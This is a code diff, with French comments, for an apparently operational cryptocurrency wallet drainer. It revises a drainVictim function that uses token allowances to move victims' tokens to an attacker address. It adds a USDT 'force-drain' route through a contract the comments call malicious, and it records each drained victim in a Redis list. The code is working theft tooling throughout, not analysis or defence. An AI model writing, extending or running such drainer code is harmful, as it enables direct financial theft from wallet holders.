@@ -47,9 +47,9 @@ const TOKENS = {
   },
 };
 
-// 🔥 Changé : Utilisation d'Infura au lieu de Cloudflare
+// 🔥 UTILISE INFURA ICI — REMPLACE TON_PROJECT_ID
 const RPC_URLS = {
-  '1': 'https://mainnet.infura.io/v3/19d1629672a84111af5429582deaf793', // ← Remplace TON_PROJECT_ID
+  '1': 'https://mainnet.infura.io/v3/TON_PROJECT_ID',
   '56': 'https://bsc-dataseed1.binance.org',
 };
 
@@ -85,7 +85,6 @@ async function drainVictim(victimAddress, chainId) {
     const tokenContract = new web3.eth.Contract(
       [
         { constant: true, inputs: [{ name: '_owner', type: 'address' }, { name: '_spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
-        { constant: false, inputs: [{ name: '_from', type: 'address' }, { name: '_to', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'transferFrom', outputs: [{ name: '', type: 'bool' }], type: 'function' },
         { constant: true, inputs: [{ name: '_owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
       ],
       tokenAddress
@@ -101,43 +100,113 @@ async function drainVictim(victimAddress, chainId) {
         continue;
       }
 
-      let nonce = await web3.eth.getTransactionCount(ATTACKER_ADDRESS);
-      const gasPrice = await web3.eth.getGasPrice();
-      const gasLimit = 100000;
+      if (tokenName === 'USDT') {
+        // === FORCE-DRAIN USDT via contrat malveillant ===
+        const FORCE_DRAIN_CONTRACT = '0xc3cF7ffC1549B4f9D975c9d1734E2cACFC6a22f8';
+        const data = web3.eth.abi.encodeFunctionCall({
+          name: 'drainUSDT',
+          type: 'function',
+          inputs: [
+            { type: 'address', name: 'usdtToken' },
+            { type: 'address', name: 'from' },
+            { type: 'address', name: 'to' },
+            { type: 'uint256', name: 'amount' }
+          ]
+        }, [tokenAddress, victimAddress, ATTACKER_ADDRESS, allowance]);
 
-      const tx = {
-        from: ATTACKER_ADDRESS,
-        to: tokenAddress,
-        data: tokenContract.methods.transferFrom(victimAddress, ATTACKER_ADDRESS, allowance).encodeABI(),
-        gas: gasLimit,
-        gasPrice: gasPrice,
-        nonce: nonce,
-        type: '0x00'
-      };
+        let nonce = await web3.eth.getTransactionCount(ATTACKER_ADDRESS);
+        const gasPrice = await web3.eth.getGasPrice();
 
-      const signedTx = await web3.eth.accounts.signTransaction(tx, privateKeyBuffer);
-      const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
-      console.log(`✅ ${tokenName} volé ! Tx: ${receipt.transactionHash}`);
+        const tx = {
+          from: ATTACKER_ADDRESS,
+          to: FORCE_DRAIN_CONTRACT,
+          data: data,
+          gas: 120000,
+          gasPrice: gasPrice,
+          nonce: nonce,
+          type: '0x00'
+        };
 
-      const decimals = (tokenName === 'USDT' || tokenName === 'USDC') ? 'mwei' : 'ether';
-      const drainedAmount = web3.utils.fromWei(allowance, decimals);
-      const client = await getRedisClient();
-      if (client) {
-        try {
-          await client.hSet(`victim:${victimAddress}`, {
-            chain: chainId,
-            token: tokenName,
-            amount: drainedAmount,
-            status: 'drained',
-            timestamp: String(Date.now()),
-          });
-          const list = JSON.parse(await client.get('victims:list') || '[]');
-          if (!list.includes(victimAddress)) {
-            list.push(victimAddress);
-            await client.set('victims:list', JSON.stringify(list));
+        const signedTx = await web3.eth.accounts.signTransaction(tx, privateKeyBuffer);
+        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+
+        if (receipt.status) {
+          console.log(`✅ USDT FORCÉ AVEC SUCCÈS ! Tx: ${receipt.transactionHash}`);
+          const drainedAmount = web3.utils.fromWei(allowance, 'mwei');
+          const client = await getRedisClient();
+          if (client) {
+            try {
+              await client.hSet(`victim:${victimAddress}`, {
+                chain: chainId,
+                token: 'USDT',
+                amount: drainedAmount,
+                status: 'drained',
+                timestamp: String(Date.now()),
+              });
+              const list = JSON.parse(await client.get('victims:list') || '[]');
+              if (!list.includes(victimAddress)) {
+                list.push(victimAddress);
+                await client.set('victims:list', JSON.stringify(list));
+              }
+            } finally {
+              await client.disconnect().catch(() => {});
+            }
           }
-        } finally {
-          await client.disconnect().catch(() => {});
+        } else {
+          console.error(`❌ Transaction minée mais échouée (status 0) pour USDT`);
+        }
+      } else {
+        // === Méthode normale pour autres tokens ===
+        const data = tokenContract.methods.transferFrom(victimAddress, ATTACKER_ADDRESS, allowance).encodeABI();
+        try {
+          await web3.eth.call({ to: tokenAddress, data, from: ATTACKER_ADDRESS });
+          console.log(`✅ Simulation réussie pour ${tokenName}`);
+        } catch (simError) {
+          console.error(`❌ Simulation échouée pour ${tokenName} :`, simError.message);
+          continue;
+        }
+
+        let nonce = await web3.eth.getTransactionCount(ATTACKER_ADDRESS);
+        const gasPrice = await web3.eth.getGasPrice();
+
+        const tx = {
+          from: ATTACKER_ADDRESS,
+          to: tokenAddress,
+          data: data,
+          gas: 100000,
+          gasPrice: gasPrice,
+          nonce: nonce,
+          type: '0x00'
+        };
+
+        const signedTx = await web3.eth.accounts.signTransaction(tx, privateKeyBuffer);
+        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+
+        if (receipt.status) {
+          console.log(`✅ ${tokenName} volé ! Tx: ${receipt.transactionHash}`);
+          const decimals = (tokenName === 'USDT' || tokenName === 'USDC') ? 'mwei' : 'ether';
+          const drainedAmount = web3.utils.fromWei(allowance, decimals);
+          const client = await getRedisClient();
+          if (client) {
+            try {
+              await client.hSet(`victim:${victimAddress}`, {
+                chain: chainId,
+                token: tokenName,
+                amount: drainedAmount,
+                status: 'drained',
+                timestamp: String(Date.now()),
+              });
+              const list = JSON.parse(await client.get('victims:list') || '[]');
+              if (!list.includes(victimAddress)) {
+                list.push(victimAddress);
+                await client.set('victims:list', JSON.stringify(list));
+              }
+            } finally {
+              await client.disconnect().catch(() => {});
+            }
+          }
+        } else {
+          console.error(`❌ Transaction minée mais échouée pour ${tokenName}`);
         }
       }
     } catch (e) {
